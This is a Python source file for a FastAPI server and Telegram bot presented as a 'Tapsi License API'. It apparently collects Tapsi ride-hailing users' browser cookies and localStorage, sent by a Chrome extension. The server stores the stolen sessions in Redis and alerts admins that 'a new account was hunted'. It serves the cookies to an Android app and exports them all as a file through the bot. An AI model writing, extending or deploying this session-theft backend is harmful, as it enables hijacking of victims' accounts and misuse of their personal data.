# -*- coding: utf-8 -*-
import logging
import json
import os
import uuid
import asyncio
import redis
import io
from datetime import datetime

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware  # اضافه شده برای رفع خطای افزونه
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import uvicorn

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, Bot
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

# --- لاگ‌ها ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- متغیرهای محیطی ---
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "توکن_ربات_تپسی_را_اینجا_بگذارید")
allowed_users_env = os.getenv("ALLOWED_USER_IDS", "آیدی_عددی_ادمین_را_اینجا_بگذارید")
ALLOWED_USER_IDS = [int(x.strip()) for x in allowed_users_env.split(",") if x.strip().isdigit()]

REDIS_URL = os.getenv("REDIS_URL")
PORT      = int(os.getenv("PORT", 8000))

# --- اتصال به ردیس ---
try:
    if REDIS_URL:
        redis_client = redis.from_url(REDIS_URL, decode_responses=True)
        redis_client.ping()
        logger.info("✅ اتصال به ردیس (پروژه تپسی) موفق بود.")
    else:
        redis_client = None
except Exception as e:
    redis_client = None
    logger.error(f"❌ خطا در اتصال به ردیس تپسی: {e}")

# --- تولید لایسنس تپسی ---
def generate_tapsi_license():
    return f"TAPSI-{str(uuid.uuid4())[:8].upper()}-{str(uuid.uuid4())[:8].upper()}"

# ======================== مدل دریافت داده از افزونه ========================
class TapsiData(BaseModel):
    cookies: str
    local_storage: str
    phone_number: str = "unknown"

# ======================== وب‌سرور FastAPI ========================
app = FastAPI(title="Tapsi License API", docs_url=None, redoc_url=None)

# تنظیمات امنیتی CORS برای رفع خطای Failed to fetch در افزونه مرورگر
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # اجازه ارسال درخواست از همه افزونه‌ها و سایت‌ها
    allow_credentials=True,
    allow_methods=["*"],  # اجازه به تمامی متدها (POST, GET و...)
    allow_headers=["*"],
)

@app.post("/api/tapsi/create-license")
async def create_tapsi_license(data: TapsiData):
    """این اندپوینت اطلاعات را از افزونه کروم می‌گیرد و لایسنس می‌سازد."""
    if not redis_client:
        raise HTTPException(status_code=503, detail="Database unavailable")

    license_key = generate_tapsi_license()
    now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    redis_data = {
        "license_key": license_key,
        "phone_number": data.phone_number,
        "cookies": data.cookies,
        "local_storage": data.local_storage,
        "created_at": now_str
    }

    try:
        redis_client.set(f"tapsi:license:{license_key}", json.dumps(redis_data, ensure_ascii=False))
    except Exception as e:
        logger.error(f"Redis save error: {e}")
        raise HTTPException(status_code=500, detail="Database save error")

    # ارسال پیام خودکار به ادمین‌های ربات تلگرام
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    for admin_id in ALLOWED_USER_IDS:
        try:
            msg = (
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "🔥 *یک اکانت تپسی جدید شکار شد!*\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔑 لایسنس: `{license_key}`\n"
                f"📱 شماره: `{data.phone_number}`\n"
                f"⏰ زمان: `{now_str}`\n\n"
                "✅ اطلاعات نشست با موفقیت ذخیره شد."
            )
            await bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to notify admin {admin_id}: {e}")

    return JSONResponse(content={
        "success": True,
        "license_key": license_key,
        "message": "License created successfully"
    })

@app.get("/api/tapsi/get-license/{license_key}")
async def get_tapsi_license(license_key: str):
    """این اندپوینت برای اپلیکیشن اندروید است تا کوکی‌ها را بگیرد."""
    if not license_key.startswith("TAPSI-"):
        raise HTTPException(status_code=400, detail="Invalid license format")
    if not redis_client:
        raise HTTPException(status_code=503, detail="Database unavailable")

    raw = redis_client.get(f"tapsi:license:{license_key}")
    if not raw:
        raise HTTPException(status_code=404, detail="License not found")

    return JSONResponse(content={"success": True, "data": json.loads(raw)})

@app.get("/health")
async def health_check():
    db_status = "connected" if redis_client else "disconnected"
    return {"status": "ok", "database": db_status}


# ======================== ربات تلگرام تپسی ========================

def kb_tapsi_admin() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 آمار لایسنس‌های تپسی", callback_data='tapsi_stats')],
        [InlineKeyboardButton("📥 استخراج فایل کوکی‌ها", callback_data='tapsi_extract')],
        [InlineKeyboardButton("🗑 راهنمای حذف لایسنس", callback_data='tapsi_delete_hint')]
    ])

async def start_tapsi_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in ALLOWED_USER_IDS:
        return
    
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🚕 *پنل مدیریت اختصاصی تپسی*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "این ربات به افزونه مرورگر متصل است. به محض لاگین در مرورگر، لایسنس‌ها در اینجا برای شما ارسال می‌شوند.\n\n"
        "یک گزینه را انتخاب کنید:"
    )
    await update.message.reply_text(text, reply_markup=kb_tapsi_admin(), parse_mode='Markdown')

async def delete_tapsi_license(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in ALLOWED_USER_IDS:
        return
    if not context.args:
        await update.message.reply_text("⚠️ *راهنما:*\n`/delete TAPSI-XXXX-XXXX`", parse_mode='Markdown')
        return
        
    license_key = context.args[0].strip()
    if not license_key.startswith("TAPSI-"):
        await update.message.reply_text("⚠️ فرمت لایسنس نامعتبر است.", parse_mode='Markdown')
        return
        
    if redis_client and redis_client.delete(f"tapsi:license:{license_key}"):
        await update.message.reply_text(f"✅ لایسنس `{license_key}` حذف شد.", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"⚠️ لایسنس `{license_key}` یافت نشد.", parse_mode='Markdown')

async def tapsi_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in ALLOWED_USER_IDS:
        await query.answer("⛔️ دسترسی غیرمجاز.", show_alert=True)
        return

    if not redis_client:
        await query.answer("❌ دیتابیس متصل نیست!", show_alert=True)
        return

    keys = redis_client.keys("tapsi:license:*")

    if query.data == 'tapsi_stats':
        await query.answer()
        text = (
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📊 *آمار دیتابیس تپسی*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🗄 تعداد کل لایسنس‌های استخراج شده: `{len(keys)}`\n\n"
            "برای بازگشت /start را ارسال کنید."
        )
        await query.edit_message_text(text, parse_mode='Markdown')

    elif query.data == 'tapsi_extract':
        if not keys:
            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
            return
            
        await query.answer("درحال آماده‌سازی فایل...")
        lines = ["گزارش نشست‌های تپسی", "=" * 40, ""]
        for k in keys:
            try:
                data = json.loads(redis_client.get(k))
                lines.append(f"لایسنس: {data.get('license_key')}")
                lines.append(f"شماره: {data.get('phone_number')}")
                lines.append(f"زمان ثبت: {data.get('created_at')}")
                lines.append(f"Cookies:\n{data.get('cookies')}")
                lines.append("-" * 40)
            except: pass
            
        doc = io.BytesIO("\n".join(lines).encode('utf-8'))
        doc.name = f"Tapsi_Sessions_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
        await query.message.reply_document(doc, caption=f"📥 *بکاپ نشست‌های تپسی*\nتعداد: `{len(keys)}`", parse_mode='Markdown')

    elif query.data == 'tapsi_delete_hint':
        await query.answer()
        await query.message.reply_text("🗑 *برای حذف لایسنس تپسی دستور زیر را بفرستید:*\n\n`/delete TAPSI-XXXX-XXXX`", parse_mode='Markdown')

# ======================== اجرا ========================
async def run_bot():
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "توکن_ربات_تپسی_را_اینجا_بگذارید":
        logger.critical("❌ توکن ربات تپسی تنظیم نشده است.")
        return
        
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_tapsi_bot))
    application.add_handler(CommandHandler("admin", start_tapsi_bot))
    application.add_handler(CommandHandler("delete", delete_tapsi_license))
    application.add_handler(CallbackQueryHandler(tapsi_callbacks, pattern="^tapsi_"))
    
    logger.info("🤖 ربات تپسی در حال راه‌اندازی...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    await asyncio.Event().wait()

async def run_webserver():
    config = uvicorn.Config(app=app, host="0.0.0.0", port=PORT, log_level="info")
    server = uvicorn.Server(config)
    logger.info(f"🌐 وب‌سرور تپسی روی پورت {PORT} در حال راه‌اندازی...")
    await server.serve()

async def main():
    await asyncio.gather(run_bot(), run_webserver())

if __name__ == "__main__":
    asyncio.run(main())

